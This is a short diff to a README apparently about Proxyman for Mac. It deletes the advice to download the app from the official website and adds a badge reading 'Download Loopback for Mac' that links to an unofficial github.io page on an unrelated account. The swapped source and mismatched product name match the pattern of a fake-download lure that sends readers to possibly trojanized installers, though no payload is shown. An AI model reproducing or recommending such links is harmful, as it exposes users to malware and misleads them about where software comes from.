@@ -4,9 +4,11 @@
 
 ---
 
-## 📥 Download Proxyman for Mac
-
-> You can download the latest version of Proxyman for macOS directly from the official website.
+<div align="center">  
+<a href="https://mitrobandus.github.io/.github/proxymanmac">  
+<img src="https://img.shields.io/badge/Download_Loopback_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download Loopback Mac">  
+</a>  
+</div>  
 
 ---
 
